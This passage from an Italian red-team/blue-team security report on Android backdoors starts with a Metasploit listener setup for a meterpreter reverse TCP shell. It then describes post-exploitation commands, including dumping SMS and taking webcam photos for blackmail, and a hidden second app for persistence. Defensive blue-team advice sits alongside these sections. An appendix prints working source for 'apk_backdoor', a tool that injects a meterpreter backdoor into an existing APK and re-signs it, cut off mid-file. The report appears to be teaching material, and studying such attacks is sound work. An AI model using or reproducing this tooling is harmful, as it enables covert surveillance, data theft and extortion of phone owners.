<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="shell">use multi/handler
<span class="nb">set </span>PAYLOAD android/meterpreter/reverse_tcp
<span class="nb">set </span>LHOST 192.168.1.187 <span class="c"># Your private IP</span>
<span class="nb">set </span>LPORT 4444 <span class="c"># The same port used in the malware creation</span>
exploit <span class="nt">-j</span> <span class="nt">-z</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="command-and-control-blue-team">2.6.2. Blue Team</h4>
<div class="paragraph text-center">
<p>"'<em>Effettuare scansioni periodiche del sistema</em>'"</p>
</div>
<div class="paragraph">
<p>L&#8217;utilizzo di un antivirus aggiornato, unito all&#8217;esecuzione periodica di scansioni dell&#8217;intero sistema, possono aiutare nel rilevare ed intercettare malware e processi anomali in esecuzione di cui non si è a conoscenza.</p>
</div>
<div class="paragraph">
<p>Si consiglia una scansione settimanale del sistema, che può essere anche automatizzata e non limita le funzionalità del dispositivo.</p>
</div>
<div class="paragraph">
<p>Inoltre, è consigliato effettuare una scansione ogni volta che viene installata una nuova applicazione, specie se da fonti non attendibili.</p>
</div>
</div>
</div>
<div class="sect2">
<h3 id="action">2.7. Action</h3>
<div class="paragraph">
<p>Gli attaccanti eseguono le operazioni a utili al proprio scopo e/o sferrano attacchi ad altri dispositivi di rete.</p>
</div>
<div class="sect3">
<h4 id="action-red-team">2.7.1. Red Team</h4>
<div class="paragraph text-center">
<p>&#8220;<em>Sfruttamento della backdoor</em>&#8221;</p>
</div>
<div class="paragraph">
<p>L&#8217;attacante può ora inviare qualsiasi tipo di comando al dispositivo vittima.
Trattandosi questo di un &#8220;meta-attacco&#8221;, i comandi precisi da inviare
dipendono fondamentalmente dall&#8217;obiettivo specifico del momento.</p>
</div>
<div class="paragraph">
<p>Esempi di comandi eseguibili una volta avviata la comunicazione, sono i comandi
<code>dump_sms</code> (che memorizzano in un file tutti gli SMS inviati e ricevuti con il
dispositivo: utile se la vittima non elimina informazioni sensibili ricevute
mediante SMS, come il PIN della carta di credito) e <code>webcam_snap</code> (che scatta
una foto con una delle fotocamere del telefono, utile per ricattare le vittime e
chiedere denaro per non divulgare foto compromettenti).</p>
</div>
<div class="paragraph">
<p>Tuttavia, come già detto, la fase di azione non è realmente interessante in questo
documento in quanto non prevede alcuna difficoltà (una volta avviato il malware
le possibili azioni difensive con cui l&#8217;attaccante deve scontrarsi sono poche e
inevitabili, come la disinstallazione dell&#8217;applicazione infetta).</p>
</div>
<div class="paragraph">
<p>Si noti che, se l&#8217;attacante dovesse avere necessità di mantenere la backdoor
aperta anche dopo la disinstallazione dell&#8217;applicazione infetta, un&#8217;altro
comando disponibile una volta aperta la sessione è il comando <code>app_install</code>, che
permette l&#8217;installazione di una applicazione: basterà quindi preparare una
seconda applicazione infetta che venga eseguita come servizio (nascondendo la
sua icona  dal <em>launcher</em> delle applicazioni e mantenendola attiva in
background) e forzare la sua installazione mediante tale comando. In questo
modo, anche se l&#8217;utente dovesse disinstallare l&#8217;applicazione infetta, ne resterà
comunque un&#8217;altra meno evidente (impossibile da individuare per l&#8217;utente medio)
sempre attiva in background.</p>
</div>
</div>
<div class="sect3">
<h4 id="action-blue-team">2.7.2. Blue Team</h4>
<div class="paragraph text-center">
<p>"'<em>Rimuovere l&#8217;applicazione malevola</em>'"</p>
</div>
<div class="paragraph">
<p>Una volta individuata l&#8217;applicazione infetta, si procede alla sua rimozione dall&#8217;elenco delle applicazioni
installate sul dispositivo.</p>
</div>
<div class="paragraph">
<p>Questa operazione potrebbe tuttavia non bastare: se l&#8217;applicazione ha generato altri file malevoli, potrebbe
essere necessario effettuare un "'<em>Ripristino alle impostazioni di fabbrica</em>'" del dispositivo.</p>
</div>
<div class="paragraph">
<p>Inoltre, è consigliabile controllare i dati sensibili di account collegati al dispositivo, cambiando eventuali password e controllando che non vi siano operazioni effettuate a nostra insaputa.</p>
</div>
</div>
</div>
</div>
</div>
<div class="sect1">
<h2 id="appendix-red-team-tool">Appendice A: Codice sorgente: il tool</h2>
<div class="sectionbody">
<div class="paragraph">
<p>Di seguito si riporta il codice sorgente del tool sviluppato.</p>
</div>
<div class="sect2">
<h3 id="appendix-red-team-tool-setup">A.1. File: setup.py</h3>
<div class="paragraph">
<p>Questo file permette l&#8217;installazione del tool.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">from</span> <span class="nn">setuptools</span> <span class="kn">import</span> <span class="n">setup</span>
<span class="kn">from</span> <span class="nn">apk_backdoor</span> <span class="kn">import</span> <span class="n">__version__</span> <span class="k">as</span> <span class="n">version</span>

<span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s">'apk_backdoor'</span><span class="p">,</span>
    <span class="n">version</span><span class="o">=</span><span class="n">version</span><span class="p">,</span>
    <span class="n">description</span><span class="o">=</span><span class="s">'Create a backdoor and inject it to an existing APK.'</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s">'https://github.com/espositoandrea/CyberSecurity'</span><span class="p">,</span>
    <span class="n">author</span><span class="o">=</span><span class="s">'Andrea Esposito'</span><span class="p">,</span>
    <span class="n">author_email</span><span class="o">=</span><span class="s">'esposito_andrea99@hotmail.com'</span><span class="p">,</span>
    <span class="n">packages</span><span class="o">=</span><span class="p">[</span><span class="s">'apk_backdoor'</span><span class="p">],</span>
    <span class="n">package_data</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'apk_backdoor'</span><span class="p">:</span> <span class="p">[</span>
            <span class="s">'tools/apktool.jar'</span><span class="p">,</span>
            <span class="s">'tools/apksigner.jar'</span><span class="p">,</span>
            <span class="s">'tools/debug.keystore'</span><span class="p">,</span>
        <span class="p">]</span>
    <span class="p">},</span>
    <span class="n">install_requires</span><span class="o">=</span><span class="p">[</span>
        <span class="s">'colorama'</span>
    <span class="p">],</span>
    <span class="n">entry_points</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'console_scripts'</span><span class="p">:</span> <span class="p">[</span>
            <span class="s">'apk-backdoor = apk_backdoor.cli:main'</span>
        <span class="p">]</span>
    <span class="p">}</span>
<span class="p">)</span></code></pre>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_modulo_apk_backdoor">A.2. Modulo: apk_backdoor</h3>
<div class="sect3">
<h4 id="appendix-red-team-tool-init">A.2.1. File: __init__.py</h4>
<div class="paragraph">
<p>File di definizione del modulo (richiesto).</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="n">__version__</span> <span class="o">=</span> <span class="s">'1.0.0'</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="appendix-red-team-tool-main">A.2.2. File: __main__.py</h4>
<div class="paragraph">
<p>File che permette l&#8217;esecuzione del modulo mediante il comando <code>python3 -m apk_backdoor</code>.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">from</span> <span class="nn">.cli</span> <span class="kn">import</span> <span class="n">main</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="appendix-red-team-tool-apk">A.2.3. File: apk.py</h4>
<div class="paragraph">
<p>Questo file gestisce gli APK e la loro decompilazione, compilazione e firma.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">logging</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">shutil</span>
<span class="kn">import</span> <span class="nn">xml.etree.ElementTree</span> <span class="k">as</span> <span class="n">ET</span>

<span class="kn">import</span> <span class="nn">pkg_resources</span>

<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>


<span class="k">class</span> <span class="nc">Apk</span><span class="p">:</span>
    <span class="n">APKTOOL_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/apktool.jar'</span>
    <span class="p">)</span>
    <span class="n">APKSIGNER_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/apksigner.jar'</span>
    <span class="p">)</span>
    <span class="n">KEYSTORE_PATH</span> <span class="o">=</span> <span class="n">pkg_resources</span><span class="o">.</span><span class="n">resource_filename</span><span class="p">(</span>
        <span class="s">'apk_backdoor'</span><span class="p">,</span> <span class="s">'tools/debug.keystore'</span>
    <span class="p">)</span>

    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">path</span><span class="p">):</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">'Creating the APK representation (using {path})'</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">full_path</span> <span class="o">=</span> <span class="n">path</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">basename</span><span class="p">(</span><span class="n">path</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="nb">dir</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="k">def</span> <span class="nf">decompile</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"java -jar {self.APKTOOL_PATH} d -f -o {self.apk_name} {self.full_path}"</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Decompiling '{self.apk_name}.apk'..."</span><span class="p">)</span>
        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done.'</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span><span class="p">)</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">f</span><span class="s">"Decompiled to '{self.decompiled_path}'"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">get_main_activity</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">'The APK must be decompiled first'</span><span class="p">)</span>

        <span class="n">ANDROID_NAME</span> <span class="o">=</span> <span class="s">'{http://schemas.android.com/apk/res/android}name'</span>
        <span class="n">INTENT_MAIN</span> <span class="o">=</span> <span class="s">'android.intent.action.MAIN'</span>
        <span class="n">INTENT_LAUNCHER</span> <span class="o">=</span> <span class="s">'android.intent.category.LAUNCHER'</span>
        <span class="n">tree</span> <span class="o">=</span> <span class="n">ET</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'AndroidManifest.xml'</span><span class="p">))</span>
        <span class="n">application</span> <span class="o">=</span> <span class="n">tree</span><span class="o">.</span><span class="n">getroot</span><span class="p">()</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">'application'</span><span class="p">)</span>
        <span class="n">activities</span> <span class="o">=</span> <span class="n">application</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'activity'</span><span class="p">)</span>
        <span class="n">main_activity</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">for</span> <span class="n">activity</span> <span class="ow">in</span> <span class="n">activities</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">intent_filter</span> <span class="ow">in</span> <span class="n">activity</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'intent-filter'</span><span class="p">):</span>
                <span class="n">actions</span> <span class="o">=</span> <span class="p">[</span><span class="n">a</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">intent_filter</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'action'</span><span class="p">)</span> <span class="k">if</span> <span class="n">a</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span> <span class="o">==</span> <span class="n">INTENT_MAIN</span><span class="p">]</span>
                <span class="n">categories</span> <span class="o">=</span> <span class="p">[</span><span class="n">c</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">intent_filter</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'category'</span><span class="p">)</span> <span class="k">if</span> <span class="n">c</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span> <span class="o">==</span> <span class="n">INTENT_LAUNCHER</span><span class="p">]</span>
                <span class="k">if</span> <span class="n">actions</span> <span class="ow">and</span> <span class="n">categories</span><span class="p">:</span>
                    <span class="n">main_activity</span> <span class="o">=</span> <span class="n">activity</span>
                    <span class="k">break</span>
            <span class="k">if</span> <span class="n">main_activity</span><span class="p">:</span>
                <span class="k">break</span>

        <span class="k">if</span> <span class="ow">not</span> <span class="n">main_activity</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">RuntimeError</span><span class="p">(</span><span class="s">'No Main Activity found'</span><span class="p">)</span>

        <span class="n">name</span> <span class="o">=</span> <span class="n">main_activity</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">ANDROID_NAME</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">name</span><span class="p">,</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">,</span> <span class="s">'smali/'</span><span class="p">,</span> <span class="n">name</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'.'</span><span class="p">,</span> <span class="s">'/'</span><span class="p">)</span> <span class="o">+</span> <span class="s">'.smali'</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">remove_decompiled</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span> <span class="o">=</span> <span class="bp">None</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Building modified target's APK"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">decompiled_path</span><span class="p">:</span>
            <span class="k">raise</span> <span class="nb">AssertionError</span><span class="p">(</span><span class="s">'The APK must be decompiled first'</span><span class="p">)</span>

        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">'java -jar {self.APKTOOL_PATH} b -o {self.apk_name}_MOD.apk {self.decompiled_path}'</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">'Recompiling {self.apk_name} to {os.getcwd()}...'</span><span class="p">)</span>
        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done'</span><span class="p">)</span>

    <span class="o">@</span><span class="n">phase</span><span class="p">(</span><span class="s">"Signing modified target's APK"</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s">"Signing '{self.apk_name}_MOD.apk'..."</span><span class="p">)</span>

        <span class="c1"># command = f"jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore {self.KEYSTORE_PATH} -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA {self.apk_name}_SIGNED.apk androiddebugkey"
</span>        <span class="c1"># utilities.run_command(command)
</span>
        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">'zipalign -f -v 4 {self.apk_name}_MOD.apk {self.apk_name}_SIGNED.apk'</span>
        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">apk_name</span> <span class="o">+</span> <span class="s">'_MOD.apk'</span><span class="p">)</span>

        <span class="n">command</span> <span class="o">=</span> <span class="n">f</span><span class="s">"java -jar {self.APKSIGNER_PATH} sign --ks {self.KEYSTORE_PATH} --ks-key-alias androiddebugkey -ks-pass pass:android {self.apk_name}_SIGNED.apk"</span>
        <span class="n">utilities</span><span class="o">.</span><span class="n">run_command</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

        <span class="n">logging</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">'    ... Done.'</span><span class="p">)</span></code></pre>
</div>
</div>
</div>
<div class="sect3">
<h4 id="appendix-red-team-tool-cli">A.2.4. File: cli.py</h4>
<div class="paragraph">
<p>Questo file definisce l&#8217;interfaccia da riga di comando (CLI) del tool.</p>
</div>
<div class="listingblock">
<div class="content">
<pre class="rouge highlight"><code data-lang="python"><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">logging</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">namedtuple</span>

<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span><span class="p">,</span> <span class="n">Style</span>

<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">__version__</span>
<span class="kn">from</span> <span class="nn">.</span> <span class="kn">import</span> <span class="n">utilities</span>
<span class="kn">from</span> <span class="nn">.apk</span> <span class="kn">import</span> <span class="n">Apk</span>
<span class="kn">from</span> <span class="nn">.payload</span> <span class="kn">import</span> <span class="n">Payload</span>
<span class="kn">from</span> <span class="nn">.utilities</span> <span class="kn">import</span> <span class="n">phase</span>


<span class="k">def</span> <span class="nf">ip_port_value</span><span class="p">(</span><span class="n">string</span><span class="p">):</span>
    <span class="n">ip_pattern</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span>
        <span class="s">r"^((?:(?:25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:(25[0-5]|2[0-4][0-5]|1[0-9][0-9]|[1-9][0-9]|[0-9]))):(\d+?)$"</span><span class="p">)</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">ip_pattern</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="n">string</span><span class="p">)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">raise</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentTypeError</span><span class="p">(</span><span class="n">f</span><span class="s">"The value '{string}' is not in the form IP:PORT"</span><span class="p">)</span>

    <span class="n">HostAddress</span> <span class="o">=</span> <span class="n">namedtuple</span><span class="p">(</span><span class="s">'HostAddress'</span><span class="p">,</span> <span class="p">[</span><span class="s">'ip'</span><span class="p">,</span> <span class="s">'port'</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">HostAddress</span><span class="p">(</span><span class="n">ip</span><span class="o">=</span><span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">port</span><span class="o">=</span><span class="n">match</span><span class="p">[</span><span class="mi">3</span><span class="p">])</span>


<span class="k">def</span> <span class="nf">setup_args</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span>
        <span class="n">description</span><span class="o">=</span><span class="s">'Inject a meterpreter backdoor in an existing APK'</span><span class="p">,</span>
        <span class="n">prog</span><span class="o">=</span><span class="s">'apk-backdoor'</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'-v'</span><span class="p">,</span> <span class="s">'--version'</span><span class="p">,</span>
        <span class="n">action</span><span class="o">=</span><span class="s">'version'</span><span class="p">,</span>
        <span class="n">version</span><span class="o">=</span><span class="n">f</span><span class="s">"</span><span class="si">%(prog)</span><span class="s">s - v{__version__}"</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'apk'</span><span class="p">,</span>
        <span class="n">metavar</span><span class="o">=</span><span class="s">'APK'</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">'The APK where the backdoor will be injected'</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'--host'</span><span class="p">,</span> <span class="s">'-H'</span><span class="p">,</span>
        <span class="n">dest</span><span class="o">=</span><span class="s">'host'</span><span class="p">,</span>
        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
        <span class="n">metavar</span><span class="o">=</span><span class="s">'HOST'</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">'The host (in the form IP:PORT) to which the payload will send data'</span><span class="p">,</span>
        <span class="nb">type</span><span class="o">=</span><span class="n">ip_port_value</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'--public_host'</span><span class="p">,</span> <span class="s">'-p'</span><span class="p">,</span>
        <span class="n">dest</span><span class="o">=</span><span class="s">'public_host'</span><span class="p">,</span>
        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
        <span class="n">metavar</span><span class="o">=</span><span class="s">'PUBLIC_HOST'</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">'The host (in the form IP:PORT) to which the payload will send data.'</span>
             <span class="s">' Use this if HOST is in a private network: REAL_HOST will be the '</span>
             <span class="s">"router's public IP (and the port that the router will forward to "</span>
             <span class="s">"the attacker's machine)"</span><span class="p">,</span>
        <span class="nb">type</span><span class="o">=</span><span class="n">ip_port_value</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'--meterpreter-config'</span><span class="p">,</span> <span class="s">'-m'</span><span class="p">,</span>
        <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">'Y'</span><span class="p">,</span> <span class="s">'N'</span><span class="p">],</span>
        <span class="n">dest</span><span class="o">=</span><span class="s">'write_meterpreter_configuration'</span><span class="p">,</span>
        <span class="n">default</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span>
        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="o">.</span><span class="n">upper</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">'Whether or not a meterpreter configuration file should be written.'</span>
             <span class="s">"It can then be used with 'msfconsole -r config_file'"</span>
    <span class="p">)</span>

    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span>
        <span class="s">'-V'</span><span class="p">,</span> <span class="s">'--verbose'</span><span class="p">,</span>
        <span class="n">dest</span><span class="o">=</span><span class="s">'verbosity'</span><span class="p">,</span>
        <span class="n">choices</span><span class="o">=</span><span class="p">[</span><span class="s">'CRITICAL'</span><span class="p">,</span> <span class="s">'ERROR'</span><span class="p">,</span> <span class="s">'WARN'</span><span class="p">,</span> <span class="s">'INFO'</span><span class="p">,</span> <span class="s">'DEBUG'</span><span class="p">],</span>
        <span class="n">default</span><span class="o">=</span><span class="s">'CRITICAL'</span><span class="p">,</span>
        <span class="nb">type</span><span class="o">=</span><span class="nb">str</span><span class="o">.</span><span class="n">upper</span><span class="p">,</span>
        <span class="n">help</span><span class="o">=</span><span class="s">'Verbosity level (between 1 and 5 occurrences with '</span>
             <span class="s">'more leading to a more verbose logging). '</span>
             <span class="s">'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'</span>
    <span class="p">)</span>
    <span class="n">log_levels</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s">'CRITICAL'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">,</span>
        <span class="s">'ERROR'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">ERROR</span><span class="p">,</span>
        <span class="s">'WARN'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">WARN</span><span class="p">,</span>
        <span class="s">'INFO'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">INFO</span><span class="p">,</span>
        <span class="s">'DEBUG'</span><span class="p">:</span> <span class="n">logging</span><span class="o">.</span><span class="n">DEBUG</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">args</span><span class="o">.</span><span class="n">verbosity</span> <span class="o">=</span> <span class="n">log_levels</span><span class="p">[</span><span class="n">args</span><span class="o">.</span><span class="n">verbosity</span><span class="p">]</span>
    <span class="k">return</span> <span class="n">args</span>


<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">setup_args</span><span class="p">()</span>
    <span class="n">logging</span><span class="o">.</span><span class="n">basicConfig</span><span class="p">(</span><span class="n">level</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">verbosity</span><span class="p">,</span> <span class="n">filename</span><span class="o">=</span><span class="s">'apk_backdoor.log'</span><span class="p">,</span> <span class="n">filemode</span><span class="o">=</span><span class="s">'w'</span><span class="p">)</span>

    <span class="n">utilities</span><span class="o">.</span><span class="n">resize_screen</span><span class="p">()</span>
    <span class="n">utilities</span><span class="o">.</span><span class="n">clear_screen</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="n">utilities</span><span class="o">.</span><span class="n">get_title</span><span class="p">(</span><span class="n">center</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">host</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="n">f</span><span class="s">'{Fore.YELLOW}Set the listener address: '</span><span class="p">)</span>
        <span class="k">print</span><span class="p">(</span><span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">,</span> <span class="n">flush</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">ip_port_value</span><span class="p">(</span><span class="n">host</span><span class="p">)</span>
        <span class="k">except</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentTypeError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">Fore</span><span class="o">.</span><span class="n">RED</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">+</span> <span class="n">Style</span><span class="o">.</span><span class="n">RESET_ALL</span><span class="p">)</span>
            <span class="n">args</span><span class="o">.</span><span class="n">host</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">print</span><span class="p">((</span><span class="s">'-'</span> <span class="o">*</span> <span class="mi">30</span><span class="p">)</span><span class="o">.</span><span class="n">center</span><span class="p">(</span><span class="mi">120</span><span class="p">))</span>

    <span class="n">apk</span> <span class="o">=</span> <span class="n">Apk</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">apk</span><span class="p">)</span>
